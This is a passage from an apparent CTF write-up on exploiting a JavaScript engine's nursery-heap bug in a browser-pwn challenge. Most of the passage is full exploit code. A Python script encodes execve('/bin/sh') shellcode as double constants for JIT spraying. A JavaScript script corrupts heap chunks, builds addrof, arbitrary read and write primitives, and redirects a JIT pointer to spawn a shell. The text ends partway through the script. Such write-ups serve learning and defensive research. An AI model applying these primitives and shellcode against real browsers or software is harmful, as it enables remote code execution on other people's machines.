</span></span><span class="line"><span class="cl">read(doubleAddBigInt(sc_start, 0x10n))
</span></span><span class="line"><span class="cl">-6.82852429045179e-229
</span></span><span class="line"><span class="cl">js&gt; read(doubleAddBigInt(sc_start, 0x18n))
</span></span><span class="line"><span class="cl">read(doubleAddBigInt(sc_start, 0x18n))
</span></span><span class="line"><span class="cl">-6.82831220543336e-229
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that all the const that we previously defined are adjacent to each other in the server.</p>
<p>Now we already know the position of our smuggled shellcode, the last step is we need to jump to it. How to do this? Simple. Remember the <code>sc</code> function metadata, in the <code>0x28</code> offset, there is a pointer to the JIT-ed area right? We just need to replace that with the address of our shellcode. And when we call <code>sc()</code>, it will jump to our shellcode. Below is the final blow for this chall</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">//</span> <span class="n">Our</span> <span class="n">real</span> <span class="n">payload</span> <span class="n">start</span> <span class="mi">8</span> <span class="n">bytes</span> <span class="n">after</span> <span class="n">it</span>
</span></span><span class="line"><span class="cl"><span class="n">sc_start</span> <span class="o">=</span> <span class="n">doubleAddBigInt</span><span class="p">(</span><span class="n">sc_start</span><span class="p">,</span> <span class="mh">0x8</span><span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">Overwrite</span> <span class="n">the</span> <span class="n">jit</span> <span class="n">address</span> <span class="n">pointer</span> <span class="n">of</span> <span class="n">our</span> <span class="n">sc</span> <span class="k">func</span> <span class="n">to</span> <span class="n">point</span> <span class="n">to</span> <span class="n">our</span> <span class="n">hidden</span> <span class="n">shellcode</span>
</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="n">jit_addr</span><span class="p">,</span> <span class="n">sc_start</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">Call</span> <span class="n">our</span> <span class="n">shell</span>
</span></span><span class="line"><span class="cl"><span class="n">sc</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>And below is the snapshot of our spawn shell in the server.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/WlolpXs.png"
        data-srcset="https://i.imgur.com/WlolpXs.png, https://i.imgur.com/WlolpXs.png 1.5x, https://i.imgur.com/WlolpXs.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/WlolpXs.png"
        title="https://i.imgur.com/WlolpXs.png" /></p>
<div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Author&#39;s Note<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>I don&rsquo;t know what is the chall intended solution, but for me I think it is enough to spawn a shell. Because in the v2 challenge, we don&rsquo;t have enough privilege to read the flag, so we need to maybe do privilege escalation? But based on the usual browser pwn challenge, spawn a shell and gain RCE should be enough to get the flag, so I assume this is enough.</p>
<p>Thanks for reading my writeup, and I&rsquo;m sorry if there are any mistakes on my explanation as this is my first time doing this kind of challenge.</p>
</div>
        </div>
    </div>
<h4 id="full-script">Full Script</h4>
<p>Below is the full script that I use to generate the smuggled shellcode</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">d2h</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;d&#39;</span><span class="p">,</span> <span class="n">f</span><span class="p">))[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">h2d</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&gt;d&#39;</span><span class="p">,</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">f</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Craft Payload</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Shellcode taken from https://ctftime.org/writeup/29915</span>
</span></span><span class="line"><span class="cl"><span class="n">instructions</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;mov ebx, 0x0068732f&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;shl rbx, 32&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;mov edx, 0x6e69622f&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;add rbx, rdx&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;push rbx&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;xor eax, eax&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;mov al, 0x3b&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;mov rdi, rsp&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;xor edx, edx&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;syscall&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;function sc() {&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;    sc_marker = </span><span class="si">{</span><span class="n">h2d</span><span class="p">(</span><span class="mh">0x41414141</span><span class="p">)</span><span class="si">}</span><span class="s1">;      // 0x41414141 in memory. Will be used during searching for the address of our const.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">bytecodes</span> <span class="o">=</span> <span class="p">[</span><span class="n">asm</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">instructions</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">bytecode</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">bytecodes</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;&lt;d&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">bytecode</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="p">)))[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;    SC</span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s1"> =</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">exit</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Below is the full script that I use to spawn the shell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="cm">/* Sequence of operations to corrupt the Nursery Heap */</span>
</span></span><span class="line"><span class="cl"><span class="c1">// NOTES:
</span></span></span><span class="line"><span class="cl"><span class="c1">// - The size that I choose is based on trial-and-error inspecting the GDB
</span></span></span><span class="line"><span class="cl"><span class="c1">// - Funny, but adding multiple line of comments also affect the nursery heap chunk layout. So I use inline comment to make sure my payload is working lol.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">)</span> <span class="c1">// This will initialize a-chunk inside the Nursery Heap. position_ (Nursery heap pointer to the first unallocated chunk) is still correct
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">b</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1">// This will add a new chunk (b-chunk) after the a-chunk position_ is still correct
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">a</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="mi">0</span> <span class="c1">// This will trigger reallocateBuffer (which is the bug). After this, the position_ is corrupted, where it is now pointing to around the middle of a-chunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">b</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">// Fill b to increase the array b total element count, so that later we can write a value to any of b array elements.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">c</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1">// This will add a new chunk (c-chunk), which overlap a-chunk &amp; b-chunk. position_ will point to around b-chunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">c</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="c1">// This will trigger reallocateBuffer (which is the bug). After this, the position_ is corrupted, where it is now pointing to around the middle of b-chunk, specifically in the area of b-chunk array elements.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">d</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="c1">// This will add a new chunk (d-chunk), which overlap b-chunk. Now, this d array metadata is actually overlapping with the b array elements. Hence, with b, we can overwrite the metadata stored for array d.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">d</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">// Fill d to increase the array d total element count.
</span></span></span><span class="line"><span class="cl"><span class="c1">// Assign 3 properties to d. This will be used during crafting addrof method
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">d</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="mf">2.4303</span><span class="nx">e</span><span class="o">-</span><span class="mi">320</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">d</span><span class="p">.</span><span class="nx">y</span> <span class="o">=</span> <span class="mf">2.4303</span><span class="nx">e</span><span class="o">-</span><span class="mi">320</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">d</span><span class="p">.</span><span class="nx">z</span> <span class="o">=</span> <span class="mf">2.4303</span><span class="nx">e</span><span class="o">-</span><span class="mi">320</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* Initializing helper method for casting purposes */</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Converter taken from https://org.anize.rs/corCTF-2021/pwn/outfoxed
</span></span></span><span class="line"><span class="cl"><span class="c1">// This will help us to convert between BigInt and Double easily
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">converter</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">u64view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">converter</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">f64view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">converter</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Bit-cast an uint64_t to a float64
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">i2d</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">u64view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">f64view</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Bit-cast a float64 to an uint64_t
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">d2i</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">f64view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">u64view</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Add double with BigInt. Return Double
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">doubleAddBigInt</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">i2d</span><span class="p">(</span><span class="nx">d2i</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="o">+</span> <span class="nx">y</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* Building function to perform read &amp; write */</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Some ideas are taken from https://webcache.googleusercontent.com/search?q=cache:ySfo3rNPA2kJ:https://labs.f-secure.com/blog/exploiting-cve-2019-17026-a-firefox-jit-bug/
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nx">d</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">d</span><span class="p">.</span><span class="nx">y</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">d</span><span class="p">.</span><span class="nx">z</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Return given object address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// The purpose of this logic is given an object, we want to get the address of it. Logic:
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - First, we will store the original pointer of the object d properties
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - Then, we will set the given object to d.y
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - Instead of reading the stored value inside d.y, what we want to read is only the 6-LSB (bytes, not bits)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//   So, the trick is we will try to read d.x+6 (shift the current object d properties pointer by 6)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - Now, the new d.x 8-bytes will consist of |d.y+5|d.y+4|d.y+3|d.y+2|d.y+1|d.y|d.x+8|d.x+7|
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - After that, convert it to BigInt, and then shift it by 2-bytes, so that we get the true address without tag.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - Revert the pointer and return the Double representation of the object address.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">original</span> <span class="o">=</span> <span class="nx">b</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nx">d</span><span class="p">.</span><span class="nx">y</span> <span class="o">=</span> <span class="nx">o</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="nx">doubleAddBigInt</span><span class="p">(</span><span class="nx">b</span><span class="p">[</span><span class="mi">27</span><span class="p">],</span> <span class="mh">0x6</span><span class="nx">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">result</span> <span class="o">=</span> <span class="nx">i2d</span><span class="p">(</span><span class="nx">d2i</span><span class="p">(</span><span class="nx">d</span><span class="p">.</span><span class="nx">x</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="nx">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="nx">original</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">result</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Write value (double) to the given address (double)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">write</span><span class="p">(</span><span class="nx">dbl_addr</span><span class="p">,</span> <span class="nx">dbl_val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// General logic:
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - Overwrite the object d properties pointter to the given address.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - Now, d.x will point to the given address.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// - Assign d.x value, which mean now the given address contains our given value.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">original</span> <span class="o">=</span> <span class="nx">b</span><span class="p">[</span><span class="mi">27</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="nx">dbl_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">d</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="nx">dbl_val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="nx">original</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">target_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">target_buf</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="mf">2.4303</span><span class="nx">e</span><span class="o">-</span><span class="mi">320</span><span class="p">)</span> <span class="c1">// Just to set the array element count
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">data_ptr</span> <span class="o">=</span> <span class="nx">doubleAddBigInt</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">target_buf</span><span class="p">),</span> <span class="mh">0x30</span><span class="nx">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Given an address in Double form, read &amp; return the address stored value as double
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">read</span><span class="p">(</span><span class="nx">dbl_addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">write</span><span class="p">(</span><span class="nx">data_ptr</span><span class="p">,</span> <span class="nx">dbl_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">target_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* JIT Spray */</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Some ideas are taken from https://ret2.life/posts/corCTF-2021/#fn:2
</span></span></span><span class="line"><span class="cl"><span class="c1">// Shellcode are inspired from https://ctftime.org/writeup/29915
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// This will be JITed later. These const will be stored in a r-x region after being JITed.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">sc</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">sc_marker</span> <span class="o">=</span> <span class="mf">5.40900888</span><span class="nx">e</span><span class="o">-</span><span class="mi">315</span><span class="p">;</span>      <span class="c1">// 0x41414141 in memory. Will be used during searching for the address of our const.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">SC1</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.827620262216015</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC2</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.82852429045179</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC3</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.82831220543336</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC4</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.828527040799766</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
